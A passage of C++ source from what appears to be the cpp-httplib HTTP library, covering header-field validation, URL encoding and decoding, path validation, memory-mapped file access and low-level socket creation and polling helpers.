class mmap {
public:
  mmap(const char *path);
  ~mmap();

  bool open(const char *path);
  void close();

  bool is_open() const;
  size_t size() const;
  const char *data() const;

private:
#if defined(_WIN32)
  HANDLE hFile_ = NULL;
  HANDLE hMapping_ = NULL;
#else
  int fd_ = -1;
#endif
  size_t size_ = 0;
  void *addr_ = nullptr;
  bool is_open_empty_file = false;
};

// NOTE: https://www.rfc-editor.org/rfc/rfc9110#section-5
namespace fields {

inline bool is_token_char(char c) {
  return std::isalnum(c) || c == '!' || c == '#' || c == '$' || c == '%' ||
         c == '&amp;' || c == '\'' || c == '*' || c == '+' || c == '-' ||
         c == '.' || c == '^' || c == '_' || c == '`' || c == '|' || c == '~';
}

inline bool is_token(const std::string &amp;s) {
  if (s.empty()) { return false; }
  for (auto c : s) {
    if (!is_token_char(c)) { return false; }
  }
  return true;
}

inline bool is_field_name(const std::string &amp;s) { return is_token(s); }

inline bool is_vchar(char c) { return c &gt;= 33 &amp;&amp; c &lt;= 126; }

inline bool is_obs_text(char c) { return 128 &lt;= static_cast&lt;unsigned char&gt;(c); }

inline bool is_field_vchar(char c) { return is_vchar(c) || is_obs_text(c); }

inline bool is_field_content(const std::string &amp;s) {
  if (s.empty()) { return true; }

  if (s.size() == 1) {
    return is_field_vchar(s[0]);
  } else if (s.size() == 2) {
    return is_field_vchar(s[0]) &amp;&amp; is_field_vchar(s[1]);
  } else {
    size_t i = 0;

    if (!is_field_vchar(s[i])) { return false; }
    i++;

    while (i &lt; s.size() - 1) {
      auto c = s[i++];
      if (c == ' ' || c == '\t' || is_field_vchar(c)) {
      } else {
        return false;
      }
    }

    return is_field_vchar(s[i]);
  }
}

inline bool is_field_value(const std::string &amp;s) { return is_field_content(s); }

} // namespace fields

} // namespace detail

// ----------------------------------------------------------------------------

/*
 * Implementation that will be part of the .cc file if split into .h + .cc.
 */

namespace detail {

inline bool is_hex(char c, int &amp;v) {
  if (0x20 &lt;= c &amp;&amp; isdigit(c)) {
    v = c - '0';
    return true;
  } else if ('A' &lt;= c &amp;&amp; c &lt;= 'F') {
    v = c - 'A' + 10;
    return true;
  } else if ('a' &lt;= c &amp;&amp; c &lt;= 'f') {
    v = c - 'a' + 10;
    return true;
  }
  return false;
}

inline bool from_hex_to_i(const std::string &amp;s, size_t i, size_t cnt,
                          int &amp;val) {
  if (i &gt;= s.size()) { return false; }

  val = 0;
  for (; cnt; i++, cnt--) {
    if (!s[i]) { return false; }
    auto v = 0;
    if (is_hex(s[i], v)) {
      val = val * 16 + v;
    } else {
      return false;
    }
  }
  return true;
}

inline std::string from_i_to_hex(size_t n) {
  static const auto charset = "0123456789abcdef";
  std::string ret;
  do {
    ret = charset[n &amp; 15] + ret;
    n &gt;&gt;= 4;
  } while (n &gt; 0);
  return ret;
}

inline size_t to_utf8(int code, char *buff) {
  if (code &lt; 0x0080) {
    buff[0] = static_cast&lt;char&gt;(code &amp; 0x7F);
    return 1;
  } else if (code &lt; 0x0800) {
    buff[0] = static_cast&lt;char&gt;(0xC0 | ((code &gt;&gt; 6) &amp; 0x1F));
    buff[1] = static_cast&lt;char&gt;(0x80 | (code &amp; 0x3F));
    return 2;
  } else if (code &lt; 0xD800) {
    buff[0] = static_cast&lt;char&gt;(0xE0 | ((code &gt;&gt; 12) &amp; 0xF));
    buff[1] = static_cast&lt;char&gt;(0x80 | ((code &gt;&gt; 6) &amp; 0x3F));
    buff[2] = static_cast&lt;char&gt;(0x80 | (code &amp; 0x3F));
    return 3;
  } else if (code &lt; 0xE000) { // D800 - DFFF is invalid...
    return 0;
  } else if (code &lt; 0x10000) {
    buff[0] = static_cast&lt;char&gt;(0xE0 | ((code &gt;&gt; 12) &amp; 0xF));
    buff[1] = static_cast&lt;char&gt;(0x80 | ((code &gt;&gt; 6) &amp; 0x3F));
    buff[2] = static_cast&lt;char&gt;(0x80 | (code &amp; 0x3F));
    return 3;
  } else if (code &lt; 0x110000) {
    buff[0] = static_cast&lt;char&gt;(0xF0 | ((code &gt;&gt; 18) &amp; 0x7));
    buff[1] = static_cast&lt;char&gt;(0x80 | ((code &gt;&gt; 12) &amp; 0x3F));
    buff[2] = static_cast&lt;char&gt;(0x80 | ((code &gt;&gt; 6) &amp; 0x3F));
    buff[3] = static_cast&lt;char&gt;(0x80 | (code &amp; 0x3F));
    return 4;
  }

  // NOTREACHED
  return 0;
}

// NOTE: This code came up with the following stackoverflow post:
// https://stackoverflow.com/questions/180947/base64-decode-snippet-in-c
inline std::string base64_encode(const std::string &amp;in) {
  static const auto lookup =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

  std::string out;
  out.reserve(in.size());

  auto val = 0;
  auto valb = -6;

  for (auto c : in) {
    val = (val &lt;&lt; 8) + static_cast&lt;uint8_t&gt;(c);
    valb += 8;
    while (valb &gt;= 0) {
      out.push_back(lookup[(val &gt;&gt; valb) &amp; 0x3F]);
      valb -= 6;
    }
  }

  if (valb &gt; -6) { out.push_back(lookup[((val &lt;&lt; 8) &gt;&gt; (valb + 8)) &amp; 0x3F]); }

  while (out.size() % 4) {
    out.push_back('=');
  }

  return out;
}

inline bool is_valid_path(const std::string &amp;path) {
  size_t level = 0;
  size_t i = 0;

  // Skip slash
  while (i &lt; path.size() &amp;&amp; path[i] == '/') {
    i++;
  }

  while (i &lt; path.size()) {
    // Read component
    auto beg = i;
    while (i &lt; path.size() &amp;&amp; path[i] != '/') {
      if (path[i] == '\0') {
        return false;
      } else if (path[i] == '\\') {
        return false;
      }
      i++;
    }

    auto len = i - beg;
    assert(len &gt; 0);

    if (!path.compare(beg, len, ".")) {
      ;
    } else if (!path.compare(beg, len, "..")) {
      if (level == 0) { return false; }
      level--;
    } else {
      level++;
    }

    // Skip slash
    while (i &lt; path.size() &amp;&amp; path[i] == '/') {
      i++;
    }
  }

  return true;
}

inline FileStat::FileStat(const std::string &amp;path) {
#if defined(_WIN32)
  auto wpath = u8string_to_wstring(path.c_str());
  ret_ = _wstat(wpath.c_str(), &amp;st_);
#else
  ret_ = stat(path.c_str(), &amp;st_);
#endif
}
inline bool FileStat::is_file() const {
  return ret_ &gt;= 0 &amp;&amp; S_ISREG(st_.st_mode);
}
inline bool FileStat::is_dir() const {
  return ret_ &gt;= 0 &amp;&amp; S_ISDIR(st_.st_mode);
}

inline std::string encode_query_param(const std::string &amp;value) {
  std::ostringstream escaped;
  escaped.fill('0');
  escaped &lt;&lt; std::hex;

  for (auto c : value) {
    if (std::isalnum(static_cast&lt;uint8_t&gt;(c)) || c == '-' || c == '_' ||
        c == '.' || c == '!' || c == '~' || c == '*' || c == '\'' || c == '(' ||
        c == ')') {
      escaped &lt;&lt; c;
    } else {
      escaped &lt;&lt; std::uppercase;
      escaped &lt;&lt; '%' &lt;&lt; std::setw(2)
              &lt;&lt; static_cast&lt;int&gt;(static_cast&lt;unsigned char&gt;(c));
      escaped &lt;&lt; std::nouppercase;
    }
  }

  return escaped.str();
}

inline std::string encode_url(const std::string &amp;s) {
  std::string result;
  result.reserve(s.size());

  for (size_t i = 0; s[i]; i++) {
    switch (s[i]) {
    case ' ': result += "%20"; break;
    case '+': result += "%2B"; break;
    case '\r': result += "%0D"; break;
    case '\n': result += "%0A"; break;
    case '\'': result += "%27"; break;
    case ',': result += "%2C"; break;
    // case ':': result += "%3A"; break; // ok? probably...
    case ';': result += "%3B"; break;
    default:
      auto c = static_cast&lt;uint8_t&gt;(s[i]);
      if (c &gt;= 0x80) {
        result += '%';
        char hex[4];
        auto len = snprintf(hex, sizeof(hex) - 1, "%02X", c);
        assert(len == 2);
        result.append(hex, static_cast&lt;size_t&gt;(len));
      } else {
        result += s[i];
      }
      break;
    }
  }

  return result;
}

inline std::string decode_url(const std::string &amp;s,
                              bool convert_plus_to_space) {
  std::string result;

  for (size_t i = 0; i &lt; s.size(); i++) {
    if (s[i] == '%' &amp;&amp; i + 1 &lt; s.size()) {
      if (s[i + 1] == 'u') {
        auto val = 0;
        if (from_hex_to_i(s, i + 2, 4, val)) {
          // 4 digits Unicode codes
          char buff[4];
          size_t len = to_utf8(val, buff);
          if (len &gt; 0) { result.append(buff, len); }
          i += 5; // 'u0000'
        } else {
          result += s[i];
        }
      } else {
        auto val = 0;
        if (from_hex_to_i(s, i + 1, 2, val)) {
          // 2 digits hex codes
          result += static_cast&lt;char&gt;(val);
          i += 2; // '00'
        } else {
          result += s[i];
        }
      }
    } else if (convert_plus_to_space &amp;&amp; s[i] == '+') {
      result += ' ';
    } else {
      result += s[i];
    }
  }

  return result;
}

inline void read_file(const std::string &amp;path, std::string &amp;out) {
  std::ifstream fs(path, std::ios_base::binary);
  fs.seekg(0, std::ios_base::end);
  auto size = fs.tellg();
  fs.seekg(0);
  out.resize(static_cast&lt;size_t&gt;(size));
  fs.read(&amp;out[0], static_cast&lt;std::streamsize&gt;(size));
}

inline std::string file_extension(const std::string &amp;path) {
  std::smatch m;
  static auto re = std::regex("\\.([a-zA-Z0-9]+)$");
  if (std::regex_search(path, m, re)) { return m[1].str(); }
  return std::string();
}

inline bool is_space_or_tab(char c) { return c == ' ' || c == '\t'; }

inline std::pair&lt;size_t, size_t&gt; trim(const char *b, const char *e, size_t left,
                                      size_t right) {
  while (b + left &lt; e &amp;&amp; is_space_or_tab(b[left])) {
    left++;
  }
  while (right &gt; 0 &amp;&amp; is_space_or_tab(b[right - 1])) {
    right--;
  }
  return std::make_pair(left, right);
}

inline std::string trim_copy(const std::string &amp;s) {
  auto r = trim(s.data(), s.data() + s.size(), 0, s.size());
  return s.substr(r.first, r.second - r.first);
}

inline std::string trim_double_quotes_copy(const std::string &amp;s) {
  if (s.length() &gt;= 2 &amp;&amp; s.front() == '"' &amp;&amp; s.back() == '"') {
    return s.substr(1, s.size() - 2);
  }
  return s;
}

inline void
divide(const char *data, std::size_t size, char d,
       std::function&lt;void(const char *, std::size_t, const char *, std::size_t)&gt;
           fn) {
  const auto it = std::find(data, data + size, d);
  const auto found = static_cast&lt;std::size_t&gt;(it != data + size);
  const auto lhs_data = data;
  const auto lhs_size = static_cast&lt;std::size_t&gt;(it - data);
  const auto rhs_data = it + found;
  const auto rhs_size = size - lhs_size - found;

  fn(lhs_data, lhs_size, rhs_data, rhs_size);
}

inline void
divide(const std::string &amp;str, char d,
       std::function&lt;void(const char *, std::size_t, const char *, std::size_t)&gt;
           fn) {
  divide(str.data(), str.size(), d, std::move(fn));
}

inline void split(const char *b, const char *e, char d,
                  std::function&lt;void(const char *, const char *)&gt; fn) {
  return split(b, e, d, (std::numeric_limits&lt;size_t&gt;::max)(), std::move(fn));
}

inline void split(const char *b, const char *e, char d, size_t m,
                  std::function&lt;void(const char *, const char *)&gt; fn) {
  size_t i = 0;
  size_t beg = 0;
  size_t count = 1;

  while (e ? (b + i &lt; e) : (b[i] != '\0')) {
    if (b[i] == d &amp;&amp; count &lt; m) {
      auto r = trim(b, e, beg, i);
      if (r.first &lt; r.second) { fn(&amp;b[r.first], &amp;b[r.second]); }
      beg = i + 1;
      count++;
    }
    i++;
  }

  if (i) {
    auto r = trim(b, e, beg, i);
    if (r.first &lt; r.second) { fn(&amp;b[r.first], &amp;b[r.second]); }
  }
}

inline stream_line_reader::stream_line_reader(Stream &amp;strm, char *fixed_buffer,
                                              size_t fixed_buffer_size)
    : strm_(strm), fixed_buffer_(fixed_buffer),
      fixed_buffer_size_(fixed_buffer_size) {}

inline const char *stream_line_reader::ptr() const {
  if (glowable_buffer_.empty()) {
    return fixed_buffer_;
  } else {
    return glowable_buffer_.data();
  }
}

inline size_t stream_line_reader::size() const {
  if (glowable_buffer_.empty()) {
    return fixed_buffer_used_size_;
  } else {
    return glowable_buffer_.size();
  }
}

inline bool stream_line_reader::end_with_crlf() const {
  auto end = ptr() + size();
  return size() &gt;= 2 &amp;&amp; end[-2] == '\r' &amp;&amp; end[-1] == '\n';
}

inline bool stream_line_reader::getline() {
  fixed_buffer_used_size_ = 0;
  glowable_buffer_.clear();

#ifndef CPPHTTPLIB_ALLOW_LF_AS_LINE_TERMINATOR
  char prev_byte = 0;
#endif

  for (size_t i = 0;; i++) {
    char byte;
    auto n = strm_.read(&amp;byte, 1);

    if (n &lt; 0) {
      return false;
    } else if (n == 0) {
      if (i == 0) {
        return false;
      } else {
        break;
      }
    }

    append(byte);

#ifdef CPPHTTPLIB_ALLOW_LF_AS_LINE_TERMINATOR
    if (byte == '\n') { break; }
#else
    if (prev_byte == '\r' &amp;&amp; byte == '\n') { break; }
    prev_byte = byte;
#endif
  }

  return true;
}

inline void stream_line_reader::append(char c) {
  if (fixed_buffer_used_size_ &lt; fixed_buffer_size_ - 1) {
    fixed_buffer_[fixed_buffer_used_size_++] = c;
    fixed_buffer_[fixed_buffer_used_size_] = '\0';
  } else {
    if (glowable_buffer_.empty()) {
      assert(fixed_buffer_[fixed_buffer_used_size_] == '\0');
      glowable_buffer_.assign(fixed_buffer_, fixed_buffer_used_size_);
    }
    glowable_buffer_ += c;
  }
}

inline mmap::mmap(const char *path) { open(path); }

inline mmap::~mmap() { close(); }

inline bool mmap::open(const char *path) {
  close();

#if defined(_WIN32)
  auto wpath = u8string_to_wstring(path);
  if (wpath.empty()) { return false; }

#if _WIN32_WINNT &gt;= _WIN32_WINNT_WIN8
  hFile_ = ::CreateFile2(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                         OPEN_EXISTING, NULL);
#else
  hFile_ = ::CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif

  if (hFile_ == INVALID_HANDLE_VALUE) { return false; }

  LARGE_INTEGER size{};
  if (!::GetFileSizeEx(hFile_, &amp;size)) { return false; }
  // If the following line doesn't compile due to QuadPart, update Windows SDK.
  // See:
  // https://github.com/yhirose/cpp-httplib/issues/1903#issuecomment-2316520721
  if (static_cast&lt;ULONGLONG&gt;(size.QuadPart) &gt;
      (std::numeric_limits&lt;decltype(size_)&gt;::max)()) {
    // `size_t` might be 32-bits, on 32-bits Windows.
    return false;
  }
  size_ = static_cast&lt;size_t&gt;(size.QuadPart);

#if _WIN32_WINNT &gt;= _WIN32_WINNT_WIN8
  hMapping_ =
      ::CreateFileMappingFromApp(hFile_, NULL, PAGE_READONLY, size_, NULL);
#else
  hMapping_ = ::CreateFileMappingW(hFile_, NULL, PAGE_READONLY, 0, 0, NULL);
#endif

  // Special treatment for an empty file...
  if (hMapping_ == NULL &amp;&amp; size_ == 0) {
    close();
    is_open_empty_file = true;
    return true;
  }

  if (hMapping_ == NULL) {
    close();
    return false;
  }

#if _WIN32_WINNT &gt;= _WIN32_WINNT_WIN8
  addr_ = ::MapViewOfFileFromApp(hMapping_, FILE_MAP_READ, 0, 0);
#else
  addr_ = ::MapViewOfFile(hMapping_, FILE_MAP_READ, 0, 0, 0);
#endif

  if (addr_ == nullptr) {
    close();
    return false;
  }
#else
  fd_ = ::open(path, O_RDONLY);
  if (fd_ == -1) { return false; }

  struct stat sb;
  if (fstat(fd_, &amp;sb) == -1) {
    close();
    return false;
  }
  size_ = static_cast&lt;size_t&gt;(sb.st_size);

  addr_ = ::mmap(NULL, size_, PROT_READ, MAP_PRIVATE, fd_, 0);

  // Special treatment for an empty file...
  if (addr_ == MAP_FAILED &amp;&amp; size_ == 0) {
    close();
    is_open_empty_file = true;
    return false;
  }
#endif

  return true;
}

inline bool mmap::is_open() const {
  return is_open_empty_file ? true : addr_ != nullptr;
}

inline size_t mmap::size() const { return size_; }

inline const char *mmap::data() const {
  return is_open_empty_file ? "" : static_cast&lt;const char *&gt;(addr_);
}

inline void mmap::close() {
#if defined(_WIN32)
  if (addr_) {
    ::UnmapViewOfFile(addr_);
    addr_ = nullptr;
  }

  if (hMapping_) {
    ::CloseHandle(hMapping_);
    hMapping_ = NULL;
  }

  if (hFile_ != INVALID_HANDLE_VALUE) {
    ::CloseHandle(hFile_);
    hFile_ = INVALID_HANDLE_VALUE;
  }

  is_open_empty_file = false;
#else
  if (addr_ != nullptr) {
    munmap(addr_, size_);
    addr_ = nullptr;
  }

  if (fd_ != -1) {
    ::close(fd_);
    fd_ = -1;
  }
#endif
  size_ = 0;
}
inline int close_socket(socket_t sock) {
#ifdef _WIN32
  return closesocket(sock);
#else
  return close(sock);
#endif
}

template &lt;typename T&gt; inline ssize_t handle_EINTR(T fn) {
  ssize_t res = 0;
  while (true) {
    res = fn();
    if (res &lt; 0 &amp;&amp; errno == EINTR) {
      std::this_thread::sleep_for(std::chrono::microseconds{1});
      continue;
    }
    break;
  }
  return res;
}

inline ssize_t read_socket(socket_t sock, void *ptr, size_t size, int flags) {
  return handle_EINTR([&amp;]() {
    return recv(sock,
#ifdef _WIN32
                static_cast&lt;char *&gt;(ptr), static_cast&lt;int&gt;(size),
#else
                ptr, size,
#endif
                flags);
  });
}

inline ssize_t send_socket(socket_t sock, const void *ptr, size_t size,
                           int flags) {
  return handle_EINTR([&amp;]() {
    return send(sock,
#ifdef _WIN32
                static_cast&lt;const char *&gt;(ptr), static_cast&lt;int&gt;(size),
#else
                ptr, size,
#endif
                flags);
  });
}

template &lt;bool Read&gt;
inline ssize_t select_impl(socket_t sock, time_t sec, time_t usec) {
#ifdef CPPHTTPLIB_USE_POLL
  struct pollfd pfd;
  pfd.fd = sock;
  pfd.events = (Read ? POLLIN : POLLOUT);

  auto timeout = static_cast&lt;int&gt;(sec * 1000 + usec / 1000);

  return handle_EINTR([&amp;]() { return poll(&amp;pfd, 1, timeout); });
#else
#ifndef _WIN32
  if (sock &gt;= FD_SETSIZE) { return -1; }
#endif

  fd_set fds, *rfds, *wfds;
  FD_ZERO(&amp;fds);
  FD_SET(sock, &amp;fds);
  rfds = (Read ? &amp;fds : nullptr);
  wfds = (Read ? nullptr : &amp;fds);

  timeval tv;
  tv.tv_sec = static_cast&lt;long&gt;(sec);
  tv.tv_usec = static_cast&lt;decltype(tv.tv_usec)&gt;(usec);

  return handle_EINTR([&amp;]() {
    return select(static_cast&lt;int&gt;(sock + 1), rfds, wfds, nullptr, &amp;tv);
  });
#endif
}

inline ssize_t select_read(socket_t sock, time_t sec, time_t usec) {
  return select_impl&lt;true&gt;(sock, sec, usec);
}

inline ssize_t select_write(socket_t sock, time_t sec, time_t usec) {
  return select_impl&lt;false&gt;(sock, sec, usec);
}

inline Error wait_until_socket_is_ready(socket_t sock, time_t sec,
                                        time_t usec) {
#ifdef CPPHTTPLIB_USE_POLL
  struct pollfd pfd_read;
  pfd_read.fd = sock;
  pfd_read.events = POLLIN | POLLOUT;

  auto timeout = static_cast&lt;int&gt;(sec * 1000 + usec / 1000);

  auto poll_res = handle_EINTR([&amp;]() { return poll(&amp;pfd_read, 1, timeout); });

  if (poll_res == 0) { return Error::ConnectionTimeout; }

  if (poll_res &gt; 0 &amp;&amp; pfd_read.revents &amp; (POLLIN | POLLOUT)) {
    auto error = 0;
    socklen_t len = sizeof(error);
    auto res = getsockopt(sock, SOL_SOCKET, SO_ERROR,
                          reinterpret_cast&lt;char *&gt;(&amp;error), &amp;len);
    auto successful = res &gt;= 0 &amp;&amp; !error;
    return successful ? Error::Success : Error::Connection;
  }

  return Error::Connection;
#else
#ifndef _WIN32
  if (sock &gt;= FD_SETSIZE) { return Error::Connection; }
#endif

  fd_set fdsr;
  FD_ZERO(&amp;fdsr);
  FD_SET(sock, &amp;fdsr);

  auto fdsw = fdsr;
  auto fdse = fdsr;

  timeval tv;
  tv.tv_sec = static_cast&lt;long&gt;(sec);
  tv.tv_usec = static_cast&lt;decltype(tv.tv_usec)&gt;(usec);

  auto ret = handle_EINTR([&amp;]() {
    return select(static_cast&lt;int&gt;(sock + 1), &amp;fdsr, &amp;fdsw, &amp;fdse, &amp;tv);
  });

  if (ret == 0) { return Error::ConnectionTimeout; }

  if (ret &gt; 0 &amp;&amp; (FD_ISSET(sock, &amp;fdsr) || FD_ISSET(sock, &amp;fdsw))) {
    auto error = 0;
    socklen_t len = sizeof(error);
    auto res = getsockopt(sock, SOL_SOCKET, SO_ERROR,
                          reinterpret_cast&lt;char *&gt;(&amp;error), &amp;len);
    auto successful = res &gt;= 0 &amp;&amp; !error;
    return successful ? Error::Success : Error::Connection;
  }
  return Error::Connection;
#endif
}

inline bool is_socket_alive(socket_t sock) {
  const auto val = detail::select_read(sock, 0, 0);
  if (val == 0) {
    return true;
  } else if (val &lt; 0 &amp;&amp; errno == EBADF) {
    return false;
  }
  char buf[1];
  return detail::read_socket(sock, &amp;buf[0], sizeof(buf), MSG_PEEK) &gt; 0;
}

class SocketStream final : public Stream {
public:
  SocketStream(socket_t sock, time_t read_timeout_sec, time_t read_timeout_usec,
               time_t write_timeout_sec, time_t write_timeout_usec,
               time_t max_timeout_msec = 0,
               std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time =
                   (std::chrono::steady_clock::time_point::min)());
  ~SocketStream() override;

  bool is_readable() const override;
  bool is_writable() const override;
  ssize_t read(char *ptr, size_t size) override;
  ssize_t write(const char *ptr, size_t size) override;
  void get_remote_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  void get_local_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  socket_t socket() const override;
  time_t duration() const override;

private:
  socket_t sock_;
  time_t read_timeout_sec_;
  time_t read_timeout_usec_;
  time_t write_timeout_sec_;
  time_t write_timeout_usec_;
  time_t max_timeout_msec_;
  const std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time;

  std::vector&lt;char&gt; read_buff_;
  size_t read_buff_off_ = 0;
  size_t read_buff_content_size_ = 0;

  static const size_t read_buff_size_ = 1024l * 4;
};

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
class SSLSocketStream final : public Stream {
public:
  SSLSocketStream(
      socket_t sock, SSL *ssl, time_t read_timeout_sec,
      time_t read_timeout_usec, time_t write_timeout_sec,
      time_t write_timeout_usec, time_t max_timeout_msec = 0,
      std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time =
          (std::chrono::steady_clock::time_point::min)());
  ~SSLSocketStream() override;

  bool is_readable() const override;
  bool is_writable() const override;
  ssize_t read(char *ptr, size_t size) override;
  ssize_t write(const char *ptr, size_t size) override;
  void get_remote_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  void get_local_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  socket_t socket() const override;
  time_t duration() const override;

private:
  socket_t sock_;
  SSL *ssl_;
  time_t read_timeout_sec_;
  time_t read_timeout_usec_;
  time_t write_timeout_sec_;
  time_t write_timeout_usec_;
  time_t max_timeout_msec_;
  const std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time;
};
#endif

inline bool keep_alive(const std::atomic&lt;socket_t&gt; &amp;svr_sock, socket_t sock,
                       time_t keep_alive_timeout_sec) {
  using namespace std::chrono;

  const auto interval_usec =
      CPPHTTPLIB_KEEPALIVE_TIMEOUT_CHECK_INTERVAL_USECOND;

  // Avoid expensive `steady_clock::now()` call for the first time
  if (select_read(sock, 0, interval_usec) &gt; 0) { return true; }

  const auto start = steady_clock::now() - microseconds{interval_usec};
  const auto timeout = seconds{keep_alive_timeout_sec};

  while (true) {
    if (svr_sock == INVALID_SOCKET) {
      break; // Server socket is closed
    }

    auto val = select_read(sock, 0, interval_usec);
    if (val &lt; 0) {
      break; // Ssocket error
    } else if (val == 0) {
      if (steady_clock::now() - start &gt; timeout) {
        break; // Timeout
      }
    } else {
      return true; // Ready for read
    }
  }

  return false;
}

template &lt;typename T&gt;
inline bool
process_server_socket_core(const std::atomic&lt;socket_t&gt; &amp;svr_sock, socket_t sock,
                           size_t keep_alive_max_count,
                           time_t keep_alive_timeout_sec, T callback) {
  assert(keep_alive_max_count &gt; 0);
  auto ret = false;
  auto count = keep_alive_max_count;
  while (count &gt; 0 &amp;&amp; keep_alive(svr_sock, sock, keep_alive_timeout_sec)) {
    auto close_connection = count == 1;
    auto connection_closed = false;
    ret = callback(close_connection, connection_closed);
    if (!ret || connection_closed) { break; }
    count--;
  }
  return ret;
}

template &lt;typename T&gt;
inline bool
process_server_socket(const std::atomic&lt;socket_t&gt; &amp;svr_sock, socket_t sock,
                      size_t keep_alive_max_count,
                      time_t keep_alive_timeout_sec, time_t read_timeout_sec,
                      time_t read_timeout_usec, time_t write_timeout_sec,
                      time_t write_timeout_usec, T callback) {
  return process_server_socket_core(
      svr_sock, sock, keep_alive_max_count, keep_alive_timeout_sec,
      [&amp;](bool close_connection, bool &amp;connection_closed) {
        SocketStream strm(sock, read_timeout_sec, read_timeout_usec,
                          write_timeout_sec, write_timeout_usec);
        return callback(strm, close_connection, connection_closed);
      });
}

inline bool process_client_socket(
    socket_t sock, time_t read_timeout_sec, time_t read_timeout_usec,
    time_t write_timeout_sec, time_t write_timeout_usec,
    time_t max_timeout_msec,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
    std::function&lt;bool(Stream &amp;)&gt; callback) {
  SocketStream strm(sock, read_timeout_sec, read_timeout_usec,
                    write_timeout_sec, write_timeout_usec, max_timeout_msec,
                    start_time);
  return callback(strm);
}

inline int shutdown_socket(socket_t sock) {
#ifdef _WIN32
  return shutdown(sock, SD_BOTH);
#else
  return shutdown(sock, SHUT_RDWR);
#endif
}

inline std::string escape_abstract_namespace_unix_domain(const std::string &amp;s) {
  if (s.size() &gt; 1 &amp;&amp; s[0] == '\0') {
    auto ret = s;
    ret[0] = '@';
    return ret;
  }
  return s;
}

inline std::string
unescape_abstract_namespace_unix_domain(const std::string &amp;s) {
  if (s.size() &gt; 1 &amp;&amp; s[0] == '@') {
    auto ret = s;
    ret[0] = '\0';
    return ret;
  }
  return s;
}

template &lt;typename BindOrConnect&gt;
socket_t create_socket(const std::string &amp;host, const std::string &amp;ip, int port,
                       int address_family, int socket_flags, bool tcp_nodelay,
                       bool ipv6_v6only, SocketOptions socket_options,
                       BindOrConnect bind_or_connect) {
  // Get address info
  const char *node = nullptr;
  struct addrinfo hints;
  struct addrinfo *result;

  memset(&amp;hints, 0, sizeof(struct addrinfo));
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_IP;

  if (!ip.empty()) {
    node = ip.c_str();
    // Ask getaddrinfo to convert IP in c-string to address
    hints.ai_family = AF_UNSPEC;
    hints.ai_flags = AI_NUMERICHOST;
  } else {
    if (!host.empty()) { node = host.c_str(); }
    hints.ai_family = address_family;
    hints.ai_flags = socket_flags;
  }

#ifndef _WIN32
  if (hints.ai_family == AF_UNIX) {
    const auto addrlen = host.length();
    if (addrlen &gt; sizeof(sockaddr_un::sun_path)) { return INVALID_SOCKET; }

#ifdef SOCK_CLOEXEC
    auto sock = socket(hints.ai_family, hints.ai_socktype | SOCK_CLOEXEC,
                       hints.ai_protocol);
#else
    auto sock = socket(hints.ai_family, hints.ai_socktype, hints.ai_protocol);
#endif

    if (sock != INVALID_SOCKET) {
      sockaddr_un addr{};
      addr.sun_family = AF_UNIX;

      auto unescaped_host = unescape_abstract_namespace_unix_domain(host);
      std::copy(unescaped_host.begin(), unescaped_host.end(), addr.sun_path);

      hints.ai_addr = reinterpret_cast&lt;sockaddr *&gt;(&amp;addr);
      hints.ai_addrlen = static_cast&lt;socklen_t&gt;(
          sizeof(addr) - sizeof(addr.sun_path) + addrlen);

#ifndef SOCK_CLOEXEC
      fcntl(sock, F_SETFD, FD_CLOEXEC);
#endif

      if (socket_options) { socket_options(sock); }

      bool dummy;
      if (!bind_or_connect(sock, hints, dummy)) {
        close_socket(sock);
        sock = INVALID_SOCKET;
      }
    }
    return sock;
  }
#endif

  auto service = std::to_string(port);

  if (getaddrinfo(node, service.c_str(), &amp;hints, &amp;result)) {
#if defined __linux__ &amp;&amp; !defined __ANDROID__
    res_init();
#endif
    return INVALID_SOCKET;
  }
  auto se = detail::scope_exit([&amp;] { freeaddrinfo(result); });

  for (auto rp = result; rp; rp = rp-&gt;ai_next) {
    // Create a socket
#ifdef _WIN32
    auto sock =
        WSASocketW(rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol, nullptr, 0,
                   WSA_FLAG_NO_HANDLE_INHERIT | WSA_FLAG_OVERLAPPED);
    /**
     * Since the WSA_FLAG_NO_HANDLE_INHERIT is only supported on Windows 7 SP1
     * and above the socket creation fails on older Windows Systems.
     *
     * Let's try to create a socket the old way in this case.
     *
     * Reference:
     * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
     *
     * WSA_FLAG_NO_HANDLE_INHERIT:
     * This flag is supported on Windows 7 with SP1, Windows Server 2008 R2 with
     * SP1, and later
     *
     */
    if (sock == INVALID_SOCKET) {
      sock = socket(rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);
    }
#else

#ifdef SOCK_CLOEXEC
    auto sock =
        socket(rp-&gt;ai_family, rp-&gt;ai_socktype | SOCK_CLOEXEC, rp-&gt;ai_protocol);
#else
    auto sock = socket(rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);
#endif

#endif
    if (sock == INVALID_SOCKET) { continue; }

#if !defined _WIN32 &amp;&amp; !defined SOCK_CLOEXEC
    if (fcntl(sock, F_SETFD, FD_CLOEXEC) == -1) {
      close_socket(sock);
      continue;
    }
#endif

    if (tcp_nodelay) { set_socket_opt(sock, IPPROTO_TCP, TCP_NODELAY, 1); }

    if (rp-&gt;ai_family == AF_INET6) {
      set_socket_opt(sock, IPPROTO_IPV6, IPV6_V6ONLY, ipv6_v6only ? 1 : 0);
    }

    if (socket_options) { socket_options(sock); }

    // bind or connect
    auto quit = false;
    if (bind_or_connect(sock, *rp, quit)) { return sock; }

    close_socket(sock);

    if (quit) { break; }
  }

  return INVALID_SOCKET;
}

